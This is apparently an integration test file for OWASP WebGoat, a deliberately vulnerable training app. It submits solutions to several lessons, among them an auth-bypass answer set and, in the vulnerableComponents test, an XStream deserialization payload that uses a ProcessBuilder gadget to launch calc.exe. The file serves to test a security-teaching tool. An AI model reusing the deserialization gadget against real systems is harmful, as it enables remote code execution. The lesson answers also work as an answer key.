/*
 * SPDX-FileCopyrightText: Copyright © 2019 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.integration

import io.restassured.RestAssured
import io.restassured.http.ContentType
import org.hamcrest.CoreMatchers
import org.hamcrest.MatcherAssert
import org.junit.jupiter.api.Test

class GeneralLessonIntegrationTest : IntegrationTest() {
    @Test
    fun httpBasics() {
        startLesson("HttpBasics")
        var params = mutableMapOf<String, Any>()
        params["person"] = "goatuser"
        checkAssignment(webGoatUrlConfig.url("HttpBasics/attack1"), params, true)

        params = mutableMapOf()
        params["answer"] = "POST"
        params["magic_answer"] = "33"
        params["magic_num"] = "4"
        checkAssignment(webGoatUrlConfig.url("HttpBasics/attack2"), params, false)

        params = mutableMapOf()
        params["answer"] = "POST"
        params["magic_answer"] = "33"
        params["magic_num"] = "33"
        checkAssignment(webGoatUrlConfig.url("HttpBasics/attack2"), params, true)

        checkResults("HttpBasics")
    }

    @Test
    fun solveAsOtherUserHttpBasics() {
        login("steven")
        startLesson("HttpBasics")
        val params = mutableMapOf<String, Any>()
        params["person"] = "goatuser"
        checkAssignment(webGoatUrlConfig.url("HttpBasics/attack1"), params, true)
    }

    @Test
    fun httpProxies() {
        startLesson("HttpProxies")
        MatcherAssert.assertThat(
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .header("x-request-intercepted", "true")
                .contentType(ContentType.JSON)
                .get(webGoatUrlConfig.url("HttpProxies/intercept-request?changeMe=Requests are tampered easily"))
                .then()
                .statusCode(200)
                .extract()
                .path("lessonCompleted"),
            CoreMatchers.`is`(true),
        )

        checkResults("HttpProxies")
    }

    @Test
    fun cia() {
        startLesson("CIA")
        val params = mutableMapOf<String, Any>()
        params["question_0_solution"] =
            "Solution 3: By stealing a database where names and emails are stored and uploading it to a website."
        params["question_1_solution"] =
            "Solution 1: By changing the names and emails of one or more users stored in a database."
        params["question_2_solution"] =
            "Solution 4: By launching a denial of service attack on the servers."
        params["question_3_solution"] =
            "Solution 2: The systems security is compromised even if only one goal is harmed."
        checkAssignment(webGoatUrlConfig.url("cia/quiz"), params, true)
        checkResults("CIA")
    }

    @Test
    fun vulnerableComponents() {
        if (!System.getProperty("running.in.docker").isNullOrBlank()) {
            val solution =
                """
                <contact class='dynamic-proxy'>
                <interface>org.owasp.webgoat.lessons.vulnerablecomponents.Contact</interface>
                  <handler class='java.beans.EventHandler'>
                    <target class='java.lang.ProcessBuilder'>
                      <command>
                        <string>calc.exe</string>
                      </command>
                    </target>
                    <action>start</action>
                  </handler>
                </contact>
                """.trimIndent()
            startLesson("VulnerableComponents")
            val params = mutableMapOf<String, Any>()
            params["payload"] = solution
            checkAssignment(webGoatUrlConfig.url("VulnerableComponents/attack1"), params, true)
            checkResults("VulnerableComponents")
        }
    }

    @Test
    fun insecureLogin() {
        startLesson("InsecureLogin")
        val params = mutableMapOf<String, Any>()
        params["username"] = "CaptainJack"
        params["password"] = "BlackPearl"
        checkAssignment(webGoatUrlConfig.url("InsecureLogin/task"), params, true)
        checkResults("InsecureLogin")
    }

    @Test
    fun securePasswords() {
        startLesson("SecurePasswords")
        var params = mutableMapOf<String, Any>()
        params["password"] = "ajnaeliclm^&&@kjn."
        checkAssignment(webGoatUrlConfig.url("SecurePasswords/assignment"), params, true)
        checkResults("SecurePasswords")

        startLesson("AuthBypass")
        params = mutableMapOf()
        params["secQuestion2"] = "John"
        params["secQuestion3"] = "Main"
        params["jsEnabled"] = "1"
        params["verifyMethod"] = "SEC_QUESTIONS"
        params["userId"] = "12309746"
        checkAssignment(webGoatUrlConfig.url("auth-bypass/verify-account"), params, true)
        checkResults("AuthBypass")

        startLesson("HttpProxies")
        MatcherAssert.assertThat(
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .header("x-request-intercepted", "true")
                .contentType(ContentType.JSON)
                .get(webGoatUrlConfig.url("HttpProxies/intercept-request?changeMe=Requests are tampered easily"))
                .then()
                .statusCode(200)
                .extract()
                .path("lessonCompleted"),
            CoreMatchers.`is`(true),
        )
        checkResults("HttpProxies")
    }

    @Test
    fun chrome() {
        startLesson("ChromeDevTools")

        var params = mutableMapOf<String, Any>()
        params["param1"] = "42"
        params["param2"] = "24"

        val result: String =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .header("webgoat-requested-by", "dom-xss-vuln")
                .header("X-Requested-With", "XMLHttpRequest")
                .formParams(params)
                .post(webGoatUrlConfig.url("CrossSiteScripting/phone-home-xss"))
                .then()
                .statusCode(200)
                .extract()
                .path("output")
        val secretNumber = result.substring("phoneHome Response is ".length)

        params = mutableMapOf()
        params["successMessage"] = secretNumber
        checkAssignment(webGoatUrlConfig.url("ChromeDevTools/dummy"), params, true)

        params = mutableMapOf()
        params["number"] = "24"
        params["network_num"] = "24"
        checkAssignment(webGoatUrlConfig.url("ChromeDevTools/network"), params, true)

        checkResults("ChromeDevTools")
    }

    @Test
    fun authByPass() {
        startLesson("AuthBypass")
        val params = mutableMapOf<String, Any>()
        params["secQuestion2"] = "John"
        params["secQuestion3"] = "Main"
        params["jsEnabled"] = "1"
        params["verifyMethod"] = "SEC_QUESTIONS"
        params["userId"] = "12309746"
        checkAssignment(webGoatUrlConfig.url("auth-bypass/verify-account"), params, true)
        checkResults("AuthBypass")
    }

    @Test
    fun lessonTemplate() {
        startLesson("LessonTemplate")
        val params = mutableMapOf<String, Any>()
        params["param1"] = "secr37Value"
        params["param2"] = "Main"
        checkAssignment(webGoatUrlConfig.url("lesson-template/sample-attack"), params, true)
        checkResults("LessonTemplate")
    }
}
